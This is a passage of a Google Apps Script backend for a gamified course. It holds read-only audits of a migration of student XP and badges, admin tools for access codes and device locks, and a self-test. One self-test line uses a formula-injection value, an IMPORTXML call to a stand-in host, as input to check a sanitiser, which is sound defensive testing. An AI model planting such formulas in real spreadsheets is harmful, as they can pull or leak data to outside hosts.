  var onlyBonus = 0, statsPartial = 0, histIncomplete = 0, otherSerious = 0;
  for (i = 0; i < dropped.length; i++) {
    var d = dropped[i];
    if (!d.flags.length && d.diffs.length &&
        d.diffs.every(function (x) { return x.indexOf('XP_UNRECONSTRUCTABLE_DIFF') === 0 ||
                                            x.indexOf('DUPLICATE_ROWS_IGNORED') === 0; })) onlyBonus++;
    if (has(d, 'STATS_PARTIAL_DIFF', 'diffs')) statsPartial++;
    if (has(d, 'HISTORY_INCOMPLETE', 'flags')) histIncomplete++;
    var serious = d.flags.filter(function (x) { return x.indexOf('HISTORY_INCOMPLETE') !== 0; });
    if (serious.length) otherSerious++;
  }
  line('   Only an unreconstructable bonus difference ... ' + onlyBonus);
  line('   Carrying STATS_PARTIAL_DIFF .................. ' + statsPartial);
  line('   Carrying HISTORY_INCOMPLETE .................. ' + histIncomplete);
  line('   Carrying any other flag ...................... ' + otherSerious);

  /* ── 4 ── */
  rule('4. DECREASES OF MORE THAN 100 XP (records with recognised history)');
  var big = dropped.filter(function (r) { return r.dashboard.xp - r.seed.xp > 100; });
  line('   ' + big.length + ' record(s).');
  if (big.length) heads();
  for (i = 0; i < big.length && i < 100; i++) { line(row(big[i])); reasons(big[i]); }
  if (big.length > 100) line('   … and ' + (big.length - 100) + ' more.');

  /* ── 5 ── */
  rule('5. REBUILT XP BELOW HALF THE LEGACY FIGURE (recognised history)');
  var halved = ordinary.filter(function (r) {
    return r.dashboard.xp > 0 && r.seed.xp < r.dashboard.xp * 0.5;
  });
  line('   ' + halved.length + ' record(s).');
  if (halved.length) heads();
  for (i = 0; i < halved.length && i < 100; i++) { line(row(halved[i])); reasons(halved[i]); }
  if (halved.length > 100) line('   … and ' + (halved.length - 100) + ' more.');

  /* ── records with no recognised history at all ── */
  rule('RECORDS WITH NO RECOGNISED HISTORY AT ALL (' + noEvidence.length + ')');
  line('   Excluded from every list above. Not one Assessments row referencing an');
  line('   activity this course defines, so there is nothing to rebuild from.');
  if (noEvidence.length) heads();
  for (i = 0; i < noEvidence.length && i < 50; i++) { line(row(noEvidence[i])); reasons(noEvidence[i]); }

  /* ── 6 ── */
  rule('6. WHY THE CONTRADICTED BADGES ARE CONTRADICTED');
  var byCode = {}, totalC = 0;
  for (i = 0; i < plan.rows.length; i++) {
    var ba = plan.rows[i].badgeAudit;
    if (!plan.rows[i].willSeed) continue;
    for (var c = 0; c < ba.contradicted.length; c++) {
      var cd = ba.contradicted[c].code || 'OTHER';
      byCode[cd] = (byCode[cd] || 0) + 1;
      totalC++;
    }
  }
  var labels = {
    MISS_RECORDED:     'a miss is recorded in the very activity the badge says was clean',
    NOT_COMPLETED:     'the activity that could have earned it was never completed',
    MODULE_INCOMPLETE: 'claims a module badge without a finished module',
    STREAK_SHORT:      'the surviving run of correct answers is shorter than required',
    UNKNOWN_BADGE:     'a badge name this course does not define',
    NO_RULE:           'no rule available to check it'
  };
  line('   Total contradicted badge claims .. ' + totalC);
  for (var k in labels) {
    if (labels.hasOwnProperty(k)) {
      line('     ' + pad_(k, 20) + pad_(byCode[k] || 0, 7) + labels[k]);
    }
  }
  var other = totalC;
  for (k in labels) if (labels.hasOwnProperty(k)) other -= (byCode[k] || 0);
  line('     ' + pad_('(other)', 20) + other);

  /* ── 7 ── */
  rule('7. CONFIRMATIONS');
  var uk = Object.keys(plan.history.unknownGates);
  var ukTotal = 0;
  for (i = 0; i < uk.length; i++) ukTotal += plan.history.unknownGates[uk[i]];
  line('   Unknown activity ids ............ ' + uk.length + ' distinct, ' + ukTotal + ' row(s)');
  for (i = 0; i < uk.length; i++) {
    line('       · "' + uk[i] + '"  ' + plan.history.unknownGates[uk[i]] + ' row(s)');
  }
  line('   ' + (uk.length === 1 && uk[0] === 'x'
        ? '✅ every unknown id is exactly "x"'
        : (uk.length === 0 ? '✅ none' : '⚠️ more than just "x" — see the list above')));
  line('');
  line('   REPLAY rows in history .......... ' + plan.history.replayRows +
       (plan.history.replayRows === 0 ? '   ✅ as expected: REPLAY did not exist in the old build'
                                      : '   ⚠️ unexpected — the old build never wrote REPLAY'));
  line('   Server-written rows ............. ' + plan.history.serverWritten +
       (plan.history.serverWritten === 0 ? '   ✅ all history is legacy; no replay can pay XP'
                                         : '   (these carry a trustworthy XP Awarded)'));
  line('');
  line('   Writes performed by this report . none');
  line('   Writes performed by ② Preview ... none');
  line('       Both call migrationPlan_(), which reads through sheetRO_() and');
  line('       never calls setValue, setValues or insertSheet. The regression');
  line('       suite snapshots every cell of every tab before and after and');
  line('       requires them identical (T-DRY1), with a control that writes one');
  line('       cell to prove the check still detects a write (T-DRY0).');
  line('');
  line('   To satisfy yourself independently: File ▸ Version history ▸ See');
  line('   version history. Running ② and this report leaves no new version.');

  line('');
  line('── Nothing above was written to the spreadsheet. ──');

  var msg = L.join('\n');
  Logger.log(msg);
  if (ui) {
    ui.alert('Outlier analysis (read-only)',
      'NOTHING WAS WRITTEN.\n\n' +
      'Decreasing records ....... ' + dropped.length + '\n' +
      'Increasing records ....... ' + gained.length + '\n' +
      'Drops over 100 XP ........ ' + big.length + '\n' +
      'Rebuilt below half ....... ' + halved.length + '\n' +
      'No recognised history .... ' + noEvidence.length + '\n' +
      'Contradicted badges ...... ' + totalC + '\n\n' +
      'Full report in the Apps Script log:\n' +
      'Extensions ▸ Apps Script, then Ctrl+Enter.',
      ui.ButtonSet.OK);
  }
  return msg;
}

/* ═══════════════════════════════════════════════════════════════════════
   READ-ONLY DIAGNOSTIC · one section at a time

   auditOutliers() emits the whole analysis in a single block, and Apps Script
   truncates a long log entry. This produces one section at a time in compact
   form, logs it in chunks so nothing is cut, and opens it in a scrollable
   dialog you can copy from.

   It calls the same migrationPlan_() and changes nothing about what the
   migration does. Writes nothing: no cells, no tabs, no properties.
   ═══════════════════════════════════════════════════════════════════════ */

/** Menu entry: asks which section, then shows it. */
function auditSection() {
  var ui = SpreadsheetApp.getUi();
  var r = ui.prompt('Outlier analysis — one section',
    'Which section?\n\n' +
    '  3  flag composition of the decreasing records\n' +
    '  4  every drop over 100 XP\n' +
    '  5  every record rebuilt below 50% of legacy\n' +
    '  6  contradicted badges by reason\n' +
    '  7  confirmations\n\n' +
    'Type a number:', ui.ButtonSet.OK_CANCEL);
  if (r.getSelectedButton() !== ui.Button.OK) return;
  return auditOutlierSection_(Number(String(r.getResponseText()).trim()));
}

/* Thin wrappers so a section can also be run straight from the editor. */
function auditSection3() { return auditOutlierSection_(3); }
function auditSection4() { return auditOutlierSection_(4); }
function auditSection5() { return auditOutlierSection_(5); }
function auditSection6() { return auditOutlierSection_(6); }
function auditSection7() { return auditOutlierSection_(7); }

function auditOutlierSection_(n) {
  var plan = migrationPlan_();
  if (!plan.ok) return deliver_('Outlier section', plan.reason);

  /* Same split as auditOutliers(): a record with no recognised history at all
     is a different kind of thing and is reported separately. */
  var ordinary = [], noEvidence = [];
  for (var i = 0; i < plan.rows.length; i++) {
    var r = plan.rows[i];
    if (!r.willSeed || !r.claimed) continue;
    if (r.evidence.gateRows === 0 && r.evidence.answerRows === 0) noEvidence.push(r);
    else ordinary.push(r);
  }
  var dropped = ordinary.filter(function (x) { return x.seed.xp < x.dashboard.xp; });
  dropped.sort(function (a, b) {
    return (a.seed.xp - a.dashboard.xp) - (b.seed.xp - b.dashboard.xp);
  });

  /* Compact flag rendering: the code only, not the whole sentence. */
  function codes(x) {
    var out = [];
    for (var q = 0; q < x.flags.length; q++) out.push(x.flags[q].split(':')[0]);
    for (q = 0; q < x.diffs.length; q++) out.push(x.diffs[q].split(':')[0].split(' (')[0]);
    return out.length ? out.join(',') : '-';
  }
  function hasFlag(x, name) {
    for (var q = 0; q < x.flags.length; q++) if (x.flags[q].indexOf(name) === 0) return true;
    return false;
  }
  function hasDiff(x, name) {
    for (var q = 0; q < x.diffs.length; q++) if (x.diffs[q].indexOf(name) === 0) return true;
    return false;
  }

  var L = [];
  function line(s) { L.push(s == null ? '' : s); }

  if (n === 3) {
    line('SECTION 3 · flag composition of the ' + dropped.length + ' XP-decreasing records');
    line('(records with no recognised history at all are excluded: ' + noEvidence.length + ')');
    line('');
    var onlyBonus = 0, onlyUnsupported = 0, statsPartial = 0,
        histInc = 0, anyOther = 0, multiSerious = 0;
    for (i = 0; i < dropped.length; i++) {
      var d = dropped[i];
      var serious = d.flags;

      if (!serious.length && hasDiff(d, 'XP_UNRECONSTRUCTABLE_DIFF')) onlyBonus++;
      if (serious.length === 1 && serious[0].indexOf('XP_UNSUPPORTED') === 0) onlyUnsupported++;
      if (hasDiff(d, 'STATS_PARTIAL_DIFF')) statsPartial++;
      if (hasFlag(d, 'HISTORY_INCOMPLETE')) histInc++;

      var other = serious.filter(function (f) {
        return f.indexOf('XP_UNSUPPORTED') !== 0 && f.indexOf('HISTORY_INCOMPLETE') !== 0;
      });
      if (other.length) anyOther++;
      if (serious.length >= 2) multiSerious++;
    }
    line('XP_UNRECONSTRUCTABLE_DIFF only .. ' + onlyBonus);
    line('XP_UNSUPPORTED only ............. ' + onlyUnsupported);
    line('STATS_PARTIAL_DIFF .............. ' + statsPartial);
    line('HISTORY_INCOMPLETE .............. ' + histInc);
    line('any other flag .................. ' + anyOther);
    line('two or more serious flags ....... ' + multiSerious);
    line('');
    line('These buckets overlap — a record can be in several — so they do not');
    line('sum to ' + dropped.length + '. The exact combinations are below.');
    line('');
    line('The first line is the benign case: the whole gap is a first-try or');
    line('flawless-run bonus that a legacy row cannot evidence.');

    /* Exact combinations. "any other flag" lumps together findings about very
       different things — a contradicted badge is not an XP problem — so the
       only way to read that number is to see what it is actually made of. */
    line('');
    line('FLAG COMBINATIONS (exact, one row per record)');
    var combos = {};
    for (i = 0; i < dropped.length; i++) {
      var key = codes(dropped[i]).split(',').sort().join(' + ');
      combos[key] = (combos[key] || 0) + 1;
    }
    var keys = [];
    for (var ck in combos) if (combos.hasOwnProperty(ck)) keys.push(ck);
    keys.sort(function (a, b) { return combos[b] - combos[a]; });
    for (i = 0; i < keys.length; i++) {
      line('  ' + pad_(combos[keys[i]], 6) + keys[i]);
    }
    line('');
    line('BADGE-ONLY findings carry no XP consequence: BADGES_CONTRADICTED and');
    line('BADGES_UNNAMED describe the badge claim, not the XP figure. A record');
    line('whose only "other" flag is one of those has an XP gap that is still');
    line('entirely the unreconstructable-bonus case.');
    var badgeOnlyOther = 0;
    for (i = 0; i < dropped.length; i++) {
      var f = dropped[i].flags;
      if (!f.length) continue;
      var nonBadge = f.filter(function (x) { return x.indexOf('BADGES_') !== 0; });
      if (!nonBadge.length) badgeOnlyOther++;
    }
    line('');
    line('  of the "any other flag" records, those whose only other flags are');
    line('  badge findings ............... ' + badgeOnlyOther);

  } else if (n === 4) {
    var big = dropped.filter(function (x) { return x.dashboard.xp - x.seed.xp > 100; });
    line('SECTION 4 · XP decrease greater than 100  (' + big.length + ' record(s))');
    line('excludes ' + noEvidence.length + ' record(s) with no recognised history');
    line('');
    line('CODE             STUDENT             LEGACY  REBUILT  DIFF   FLAGS');
    for (i = 0; i < big.length; i++) {
      var b = big[i];
      line(pad_(b.code, 17) + pad_((b.name || '').slice(0, 19), 20) +
           pad_(b.dashboard.xp, 8) + pad_(b.seed.xp, 9) +
           pad_(b.seed.xp - b.dashboard.xp, 7) + codes(b));
    }
    if (!big.length) line('(none)');

  } else if (n === 5) {
    var halved = ordinary.filter(function (x) {
      return x.dashboard.xp > 0 && x.seed.xp < x.dashboard.xp * 0.5;
    });
    halved.sort(function (a, b) {
      return (a.seed.xp / a.dashboard.xp) - (b.seed.xp / b.dashboard.xp);
    });
    line('SECTION 5 · rebuilt XP below 50% of legacy  (' + halved.length + ' record(s))');
    line('excludes ' + noEvidence.length + ' record(s) with no recognised history');
    line('');
    line('CODE             STUDENT             LEGACY  REBUILT  KEPT   FLAGS');
    for (i = 0; i < halved.length; i++) {
      var hv = halved[i];
      var pct = Math.round(hv.seed.xp / hv.dashboard.xp * 100);
      line(pad_(hv.code, 17) + pad_((hv.name || '').slice(0, 19), 20) +
           pad_(hv.dashboard.xp, 8) + pad_(hv.seed.xp, 9) + pad_(pct + '%', 7) + codes(hv));
    }
    if (!halved.length) line('(none)');

  } else if (n === 6) {
    var byCode = {}, total = 0;
    for (i = 0; i < plan.rows.length; i++) {
      if (!plan.rows[i].willSeed) continue;
      var ba = plan.rows[i].badgeAudit;
      for (var c = 0; c < ba.contradicted.length; c++) {
        var cd = ba.contradicted[c].code || 'OTHER';
        byCode[cd] = (byCode[cd] || 0) + 1;
        total++;
      }
    }
    var known = ['MISS_RECORDED', 'NOT_COMPLETED', 'MODULE_INCOMPLETE',
                 'STREAK_SHORT', 'UNKNOWN_BADGE', 'NO_RULE'];
    var accounted = 0;
    line('SECTION 6 · contradicted badge claims by reason  (' + total + ' total)');
    line('');
    for (i = 0; i < known.length; i++) {
      var v = byCode[known[i]] || 0;
      accounted += v;
      line(pad_(known[i], 20) + v);
    }
    line(pad_('OTHER', 20) + (total - accounted));
    line('');
    line('MISS_RECORDED     = evidence of an actual miss in that activity');
    line('NOT_COMPLETED     = the required activity was never completed');
    line('MODULE_INCOMPLETE = a module badge without a finished module');
    line('STREAK_SHORT      = surviving run of correct answers too short');

  } else if (n === 7) {
    line('SECTION 7 · confirmations');
    line('');
    var uk = [], ukTotal = 0;
    for (var g in plan.history.unknownGates) {
      if (plan.history.unknownGates.hasOwnProperty(g)) {
        uk.push(g); ukTotal += plan.history.unknownGates[g];
      }
    }
    line('unknown activity ids ....... ' + uk.length + ' distinct, ' + ukTotal + ' row(s)');
    for (i = 0; i < uk.length; i++) line('    "' + uk[i] + '"  ' + plan.history.unknownGates[uk[i]]);
    line('    ' + (uk.length === 1 && uk[0] === 'x' ? 'all exactly "x"'
          : uk.length === 0 ? 'none' : 'NOT all "x" — see list'));
    line('');
    line('legacy REPLAY rows ......... ' + plan.history.replayRows +
         (plan.history.replayRows === 0 ? '   (expected: REPLAY did not exist in the old build)' : '   UNEXPECTED'));
    line('server-written rows ........ ' + plan.history.serverWritten +
         (plan.history.serverWritten === 0 ? '   (expected: all history is legacy)' : ''));
    line('duplicate rows ignored ..... ' + plan.history.duplicates);
    line('');
    line('read-only: this diagnostic and ② / ②b / ②c all call migrationPlan_(),');
    line('which reads via sheetRO_() and never calls setValue, setValues or');
    line('insertSheet. Verify independently with File > Version history —');
    line('running them leaves no new version.');

  } else {
    line('Unknown section "' + n + '". Choose 3, 4, 5, 6 or 7.');
  }

  return deliver_('Outlier section ' + n, L.join('\n'));
}

/**
 * Shows long read-only text without losing any of it: chunked into separate
 * log entries (a single entry gets truncated), and opened in a scrollable
 * dialog you can select and copy from. Displays only — writes nothing.
 */
function deliver_(title, text) {
  var CH = 6000;
  for (var i = 0; i < text.length; i += CH) {
    Logger.log((i ? '[' + title + ' cont. ' + (i / CH + 1) + ']\n' : '') + text.substr(i, CH));
  }
  try {
    var esc = String(text)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    var html = HtmlService.createHtmlOutput(
      '<div style="font:12px/1.5 monospace;padding:10px">' +
      '<p style="font:600 12px sans-serif;margin:0 0 8px">Read-only — nothing was written. ' +
      'Select all and copy.</p>' +
      '<textarea style="width:100%;height:420px;font:12px/1.5 monospace" readonly>' +
      esc + '</textarea></div>')
      .setWidth(900).setHeight(520);
    SpreadsheetApp.getUi().showModalDialog(html, title);
  } catch (e) { /* headless — the log has it */ }
  return text;
}

/**
 * READ-ONLY. Everything the migration would do to ONE student, side by side.
 *
 * Same planner as auditMigration() and migrateSchema(), so what it shows is
 * what would be written. Writes nothing: no cells, no tabs, no properties.
 *
 * Run it from the menu, or from the editor as auditStudent('AAP-XXXX-XXXX').
 */
function auditStudent(codeArg) {
  var ui;
  try { ui = SpreadsheetApp.getUi(); } catch (e) { ui = null; }

  var code = codeArg;
  if (!code && ui) {
    var r = ui.prompt('Inspect one student (read-only)',
      'Access code:', ui.ButtonSet.OK_CANCEL);
    if (r.getSelectedButton() !== ui.Button.OK) return;
    code = r.getResponseText();
  }
  code = normCode_(code);

  var plan = migrationPlan_();
  if (!plan.ok) {
    if (ui) ui.alert('Cannot inspect', plan.reason, ui.ButtonSet.OK);
    return plan.reason;
  }

  var e = null;
  for (var i = 0; i < plan.rows.length; i++) {
    if (normCode_(plan.rows[i].code) === code) { e = plan.rows[i]; break; }
  }
  if (!e) {
    var miss = 'No such access code: ' + code;
    if (ui) ui.alert('Not found', miss, ui.ButtonSet.OK);
    return miss;
  }

  var L = [];
  function line(s) { L.push(s == null ? '' : s); }
  function pair(label, was, now) {
    line('   ' + pad_(label, 26) + pad_(was, 22) + '→   ' + now);
  }

  line('AAP101 · SINGLE STUDENT PREVIEW — READ ONLY, NOTHING WAS WRITTEN');
  line(new Date().toString());
  line('');
  line('   Row .................. ' + e.rowNum);
  line('   Access code .......... ' + e.code);
  line('   Student .............. ' + (e.name || '(unclaimed)'));
  line('   Section .............. ' + (e.section || ''));
  line('   Status ............... ' + e.status);
  line('   Already migrated ..... ' + (e.alreadyMigrated ? 'yes — this row would be skipped' : 'no'));
  line('');
  line('   ── (A) LEGACY DASHBOARD          →   (B) REBUILT FROM HISTORY ──');
  line('      the sheet as it stands now        what would be written');
  line('');
  pair('XP',             e.dashboard.xp,       e.seed.xp);
  pair('Correct',        e.dashboard.correct,  e.seed.correct);
  pair('Attempts',       e.dashboard.attempts, e.seed.attempts);
  pair('Accuracy %',     (e.dashboard.attempts
                          ? Math.round(e.dashboard.correct / e.dashboard.attempts * 100)
                          : 0),                e.derived.accuracy);
  pair('Best streak',    e.dashboard.streak,   e.seed.streak);
  pair('Activities done', e.dashboard.activities, e.derived.activities);
  pair('Lessons done',   e.dashboard.lessons,  e.derived.lessons);
  pair('Progress %',     e.dashboard.progress + '%', e.derived.progress + '%');
  pair('Level',          '',                   e.derived.level);
  pair('Rank',           '',                   e.derived.rank);
  pair('Badge count',    e.dashboard.badges,   e.derived.badgeCount);
  line('');
  line('   Legacy badge list:  ' + (e.dashboard.badgeList || '(none)'));
  line('   Rebuilt badge list: ' + (e.derived.badgeList || '(none)'));
  line('');
  line('   ── BADGE EVIDENCE ──');
  function badges(title, arr) {
    line('   ' + title + ' (' + arr.length + ')');
    if (!arr.length) { line('      (none)'); return; }
    for (var b = 0; b < arr.length; b++) line('      · ' + arr[b].name + ' — ' + arr[b].why);
  }
  badges('PROVEN      → written to _ServerBadges', e.badgeAudit.proven);
  badges('UNVERIFIED  → archived, never counted',  e.badgeAudit.unverified);
  badges('CONTRADICTED→ archived, never counted',  e.badgeAudit.contradicted);
  if (e.badgeAudit.unreadable) {
    line('   UNNAMED (' + e.badgeAudit.unreadable + ') — counted by the dashboard but not listed, ' +
         'so there is nothing to check');
  }
  line('');
  line('   ── EVIDENCE BEHIND THE REBUILT FIGURES ──');
  line('   Assessments rows for this code ... ' + e.evidence.rows);
  line('   Answer-level rows ................ ' + e.evidence.answerRows);
  line('   Activities evidenced ............. ' + e.evidence.gateRows);
  line('   Duplicate rows ignored ........... ' + e.evidence.duplicates);
  line('   Server-written replay awards ..... ' + e.evidence.replayAwards);
  line('   Activities: ' + (e.seed.gates.length ? e.seed.gates.join(', ') : '(none)'));
  line('');
  line('   ── DIFFERENCES THAT CANNOT BE REBUILT (' + e.diffs.length + ') ──');
  if (!e.diffs.length) line('      (none)');
  for (i = 0; i < e.diffs.length; i++) line('      · ' + e.diffs[i]);
  line('');
  line('   ── FIGURES NOTHING IN THE HISTORY ACCOUNTS FOR (' + e.flags.length + ') ──');
  if (!e.flags.length) line('      (none)');
  for (i = 0; i < e.flags.length; i++) line('      · ' + e.flags[i]);
  line('');
  line('── Nothing above was written to the spreadsheet. ──');

  var msg = L.join('\n');
  Logger.log(msg);
  if (ui) {
    ui.alert('Student preview (read-only)',
      msg.length < 1400 ? msg
        : msg.slice(0, 1200) + '\n\n… full report in the Apps Script log ' +
          '(Extensions ▸ Apps Script, then Ctrl+Enter).',
      ui.ButtonSet.OK);
  }
  return msg;
}

function initSheet_(name, headers) {
  var sh = ss_().getSheetByName(name) || ss_().insertSheet(name);
  sh.getRange(1, 1, 1, headers.length)
    .setValues([headers])
    .setFontWeight('bold')
    .setBackground('#002C39')
    .setFontColor('#FFFFFF')
    .setVerticalAlignment('middle');
  sh.setFrozenRows(1);
  sh.setRowHeight(1, 32);
  for (var i = 1; i <= headers.length; i++) sh.autoResizeColumn(i);
  return sh;
}

/** Generates n codes that are guaranteed unique against what is already there. */
function writeCodes_(sh, n) {
  var seen = {};
  if (sh.getLastRow() > 1) {
    var have = sh.getRange(2, C.CODE, sh.getLastRow() - 1, 1).getValues();
    for (var h = 0; h < have.length; h++) seen[normCode_(have[h][0])] = true;
  }

  var rows = [];
  while (rows.length < n) {
    var c = randomCode_();
    if (seen[c]) continue;
    seen[c] = true;
    var row = new Array(CODES_HEADERS.length).fill('');
    row[C.CODE - 1]      = c;
    row[C.STATUS - 1]    = 'UNUSED';
    row[C.LOGINS - 1]    = 0;
    row[C.MINUTES - 1]   = 0;
    row[C.XP - 1]        = 0;
    row[C.CORRECT - 1]   = 0;
    row[C.ATTEMPTS - 1]  = 0;
    row[C.EPOCH - 1]     = 1;
    row[C.SXP - 1]       = 0;
    row[C.SCORRECT - 1]  = 0;
    row[C.SATTEMPTS - 1] = 0;
    row[C.SSTREAK - 1]   = 0;
    row[C.SRUN - 1]      = 0;
    rows.push(row);
  }

  var start = sh.getLastRow() + 1;
  sh.getRange(start, 1, rows.length, CODES_HEADERS.length).setValues(rows);
  sh.getRange(start, C.CODE, rows.length, 1)
    .setFontFamily('Roboto Mono').setFontWeight('bold');
  return rows.length;
}

/**
 * Codes are generated with Math.random(), which is not a cryptographic RNG.
 * With a 31-character alphabet and 8 random characters the keyspace is about
 * 8.5e11 for 600 live codes, so guessing remains impractical — but if you ever
 * need codes that resist a determined attacker, swap this for Utilities.getUuid().
 */
function randomCode_() {
  function chunk(len) {
    var s = '';
    for (var i = 0; i < len; i++) {
      s += CODE_ALPHA.charAt(Math.floor(Math.random() * CODE_ALPHA.length));
    }
    return s;
  }
  return CODE_PREFIX + '-' + chunk(4) + '-' + chunk(4);
}

function addMoreCodes() {
  var ui = SpreadsheetApp.getUi();
  var n = writeCodes_(sheet_(SH_CODES), 100);
  ui.alert('Done', n + ' new access codes were added to the bottom of the AccessCodes tab.', ui.ButtonSet.OK);
}

/** Clears the device binding so a student can log in from a new phone. */
function releaseDevice() {
  var ui = SpreadsheetApp.getUi();
  var res = ui.prompt('Release a device lock',
    'Type the student\'s access code (e.g. AAP-7K3M-9RTX).\n\n' +
    'Their progress is kept — only the device lock is cleared, so they can ' +
    'log in again on a new device.', ui.ButtonSet.OK_CANCEL);
  if (res.getSelectedButton() !== ui.Button.OK) return;

  var code = normCode_(res.getResponseText());
  var row  = findCodeRow_(code);
  if (!row) { ui.alert('Not found', 'No such access code: ' + code, ui.ButtonSet.OK); return; }

  var sh = sheet_(SH_CODES);
  sh.getRange(row, C.DEVICE).setValue('');
  bumpEpoch_(row);   // the old device's session stops working straight away
  logLogin_(code, sh.getRange(row, C.NAME).getValue(), sh.getRange(row, C.SECTION).getValue(),
            'ADMIN', 'Device lock released by instructor', '', '', '', '');
  ui.alert('Released',
    code + ' can now be used on a new device.\n\nAll progress was kept, and the ' +
    'session on the old device has been signed out.', ui.ButtonSet.OK);
}

function disableCode() { setStatus_('DISABLED', 'Disable an access code', 'blocked from logging in'); }
function enableCode()  { setStatus_('ACTIVE',   'Re-enable an access code', 'able to log in again'); }

function setStatus_(status, title, what) {
  var ui = SpreadsheetApp.getUi();
  var res = ui.prompt(title, 'Type the access code:', ui.ButtonSet.OK_CANCEL);
  if (res.getSelectedButton() !== ui.Button.OK) return;

  var code = normCode_(res.getResponseText());
  var row  = findCodeRow_(code);
  if (!row) { ui.alert('Not found', 'No such access code: ' + code, ui.ButtonSet.OK); return; }

  sheet_(SH_CODES).getRange(row, C.STATUS).setValue(status);
  if (status === 'DISABLED') bumpEpoch_(row);
  ui.alert('Done', code + ' is now ' + what + '.', ui.ButtonSet.OK);
}

function showSummary() {
  var sh = sheet_(SH_CODES);
  var last = sh.getLastRow();
  if (last < 2) { SpreadsheetApp.getUi().alert('No codes yet. Run "Set up database" first.'); return; }

  var v = sh.getRange(2, 1, last - 1, CODES_HEADERS.length).getValues();
  var total = v.length, active = 0, mins = 0, xp = 0, done = 0;
  for (var i = 0; i < v.length; i++) {
    if (v[i][C.DEVICE - 1]) active++;
    mins += Number(v[i][C.MINUTES - 1] || 0);
    xp   += Number(v[i][C.XP - 1] || 0);
    if (Number(v[i][C.PROGRESS - 1] || 0) >= 100) done++;
  }
  SpreadsheetApp.getUi().alert('Class summary',
    'Codes issued:        ' + total + '\n' +
    'Codes claimed:       ' + active + '\n' +
    'Not yet used:        ' + (total - active) + '\n\n' +
    'Total study time:    ' + Math.round(mins / 60) + ' hours\n' +
    'Average XP:          ' + (active ? Math.round(xp / active) : 0) + '\n' +
    'Finished the module: ' + done,
    SpreadsheetApp.getUi().ButtonSet.OK);
}

/* ─────────────────────────── SELF-TEST ─────────────────────────── */
/* Run this from the Apps Script editor to confirm everything works before
   you hand codes out. It writes nothing permanent.                       */

function selfTest() {
  var log = [];
  function ck(label, cond) { log.push((cond ? '✅ ' : '❌ ') + label); return cond; }

  ck('AccessCodes tab exists', !!ss_().getSheetByName(SH_CODES));
  ck('Codes generated', sheet_(SH_CODES).getLastRow() > 1);
  ck('Schema upgraded', String(sheet_(SH_CODES).getRange(1, C.EPOCH).getValue()) === '_TokenEpoch');
  ck('SecurityLog tab exists', !!ss_().getSheetByName(SH_SEC));

  var code = normCode_(sheet_(SH_CODES).getRange(2, C.CODE).getValue());
  ck('Read a sample code (' + code + ')', !!code);
  ck('findCodeRow_ locates it', findCodeRow_(code) === 2);
  ck('Unknown code is rejected', !findCodeRow_('AAP-ZZZZ-ZZZZ'));

  var t = makeToken_(code, 'test-device', 1);
  ck('Token verifies', verifyToken_(t, code, 'test-device', 1));
  ck('Token rejects wrong device', !verifyToken_(t, code, 'other-device', 1));
  ck('Token rejects tampering', !verifyToken_(t + 'x', code, 'test-device', 1));
  ck('Token rejects a bumped epoch', !verifyToken_(t, code, 'test-device', 2));

  ck('Formula injection is neutralised', safeText_('=IMPORTXML("http://x","//a")').charAt(0) === "'");
  ck('Control characters are stripped', safeText_('a\u0000b') === 'ab');

  ck('Answer key covers every graded gate', allGates_().length >= 20);
  ck('Unknown gate is refused', gateSpec_('not-a-real-gate') === null);
  ck('Right answer scores', gradeAnswer_(gateSpec_('m5-kc'), 6).correct === true);
  ck('Wrong answer does not', gradeAnswer_(gateSpec_('m5-kc'), 0).correct === false);
  ck('Out-of-range answer is refused', gradeAnswer_(gateSpec_('m5-kc'), 99).ok === false);
  ck('Multi-select needs the exact set', gradeAnswer_(gateSpec_('m2-kc'), [3]).correct === false);
  ck('Multi-select accepts the exact set', gradeAnswer_(gateSpec_('m2-kc'), [3, 4]).correct === true);
  ck('Sorter needs every tile placed', gradeAnswer_(gateSpec_('m2-dnd'), { sunset: 'nature' }).ok === false);

  var chk = apiCheck_({ code: code, deviceId: 'test-device' });
  ck('check() answers a real code', chk.ok === true || chk.error === 'DEVICE_LOCKED');
  var bad = apiCheck_({ code: 'AAP-ZZZZ-ZZZZ', deviceId: 'test-device' });
  ck('check() refuses a fake code', bad.ok === false && bad.error === 'NOT_FOUND');

  ck('ping works', route_({ action: 'ping' }).ok === true);
  ck('unknown action refused', route_({ action: 'nope' }).ok === false);
  ck('grade without a token refused', apiGrade_({ code: code, gate: 'm5-kc', answer: 6 }).ok === false);

  var msg = log.join('\n');
  Logger.log(msg);
  try { SpreadsheetApp.getUi().alert('AAP101 self-test', msg, SpreadsheetApp.getUi().ButtonSet.OK); } catch (e) {}
  return msg;
}
